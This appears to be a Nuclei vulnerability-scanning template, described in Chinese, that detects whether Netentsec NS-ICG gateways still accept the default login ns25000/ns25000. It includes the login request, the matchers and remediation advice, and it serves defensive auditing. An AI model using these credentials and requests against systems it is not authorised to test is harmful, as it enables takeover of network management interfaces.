id: nsicg-default-login

info:
  name: Netentsec NS-ICG 默认口令登录（弱口令）
  author: pikpikcu
  severity: high
  description: |
    该模板用于检测 Netentsec NS-ICG 是否仍可使用默认凭据或弱口令登录。模板主要向 `/user/login/login`、`/user/main` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据状态码、认证 Cookie、跳转位置或登录后的页面关键字判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可进入 Netentsec NS-ICG 管理界面，查看或修改用户、权限、认证策略、资产信息或运维配置。
    - 身份、资产、监控或业务管理系统被弱口令接管后，可能造成越权访问、策略绕过、敏感资产信息泄露和更大范围的权限扩散。
  remediation: |
    - 立即修改默认管理员口令，禁用初始化账号，并为高权限账户启用多因素认证。
    - 限制管理入口来源，按最小权限拆分管理员角色，并开启认证、授权和配置变更审计。
    - 复核用户、角色、认证策略、访问令牌和近期登录记录，必要时强制重置相关账号凭据。
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2016-08603
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
    cpe: cpe:2.3:a:netentsec:application_security_gateway:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    fofa-query: "NS-ICG"
    product: application_security_gateway
    vendor: netentsec
  tags: nsicg,default-login,vuln

http:
  - raw:
      - |
        @timeout: 25s
        POST /user/login/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        usrname={{username}}&pass={{password}}&signinfo=&ukey_user_flag=0&SlotSerialNumber=&agree=
      - |
        @timeout: 25s
        GET /user/main HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}/user/login/

    attack: pitchfork
    payloads:
      username:
        - ns25000
      password:
        - ns25000
    matchers:
      - type: dsl
        dsl:
          - 'contains(header_1, "/user/main/")'
          - 'status_code_1 == 302'
          - 'status_code_2 == 200'
          - contains(body_2, "var loguser = \'ns25000")
        condition: and
